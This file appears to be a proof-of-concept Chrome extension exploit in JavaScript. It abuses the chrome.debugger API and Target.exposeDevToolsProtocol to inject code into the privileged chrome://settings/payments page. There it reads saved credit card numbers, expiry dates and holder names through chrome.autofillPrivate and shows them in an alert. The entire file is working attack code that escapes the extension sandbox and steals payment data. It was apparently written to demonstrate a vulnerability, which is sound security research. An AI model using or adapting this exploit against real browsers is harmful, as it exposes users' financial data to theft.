(async () => {
    const CDP_VERSION = '1.3'
    const TARGET_URL = 'chrome://settings/payments'
    const PROXY_URL = 'about:blank'

    // Attach to browser target
    await chrome.debugger.attach({targetId: 'browser'}, CDP_VERSION)

    // Create and attach to a proxy target
    const {targetId: proxyTargetId} = await chrome.debugger.sendCommand({targetId: 'browser'}, 'Target.createTarget', {
        url: PROXY_URL
    })
    await chrome.debugger.attach({targetId: proxyTargetId}, CDP_VERSION)

    // Inject "window.cdp" binding into the proxy target
    await chrome.debugger.sendCommand({targetId: 'browser'}, 'Target.exposeDevToolsProtocol', {
        targetId: proxyTargetId,
        bindingName: 'cdp'
    })

    // Create new Chrome UI target
    const {targetId} = await chrome.debugger.sendCommand({targetId: 'browser'}, 'Target.createTarget', {
        url: TARGET_URL
    })

    // Inject JavaScript payload into target through the proxy target
    const payload = async targetId => {
        window._cdpId = 0
        window._cdpCallbacks = {}
        window.cdp.onmessage = res => {
            const {id, result} = JSON.parse(res)
            if (id !== undefined && window._cdpCallbacks[id]) {
                window._cdpCallbacks[id](result)
                delete window._cdpCallbacks[id]
            }
        }

        /**
         * Send CDP command
         * @param  {string}              method Method name
         * @param  {Record<string, any>} params Method parameters
         * @return {Promise<any>}               Response
         */
        function sendCommand(method, params) {
            return new Promise(resolve => {
                const id = ++window._cdpId
                window._cdpCallbacks[id] = resolve
                window.cdp.send(JSON.stringify({id, method, params}))
            })
        }

        // Attach to target and wait a few milliseconds for it to be ready
        const {sessionId} = await sendCommand('Target.attachToTarget', {
            targetId,
            flatten: false
        })
        await new Promise(resolve => setTimeout(resolve, 250))

        // Inject arbitrary JavaScript code on target
        const secondStage = async () => {
            document.body.style.background = '#ffdde2' // Just for UI feedback
            const cards = await chrome.autofillPrivate.getCreditCardList()
            if (cards.length > 0) {
                const message = cards.map(card => {
                    return `Nickname: ${card.nickname}\n` +
                        `PAN: ${card.cardNumber}\n` +
                        `Expiration: ${card.expirationMonth}/${card.expirationYear}\n` +
                        `Holder: ${card.name}\n`
                }).join('-----------------------------\n')
                alert(message)
            } else {
                alert('No cards found, add one and reload the extension')
            }
        }
        await sendCommand('Target.sendMessageToTarget', {
            sessionId,
            message: JSON.stringify({
                id: 999,
                method: 'Runtime.evaluate',
                params: {
                    expression: `(${secondStage.toString()})()`
                }
            })
        })

        // Detach from target
        await sendCommand('Target.detachFromTarget', {sessionId})
    }
    await chrome.debugger.sendCommand({targetId: proxyTargetId}, 'Runtime.evaluate', {
        expression: `(${payload.toString()})(${JSON.stringify(targetId)})`,
        awaitPromise: true
    })

    // Close proxy target and detach from browser target
    await chrome.debugger.sendCommand({targetId: proxyTargetId}, 'Page.close')
    await chrome.debugger.detach({targetId: 'browser'})
})()
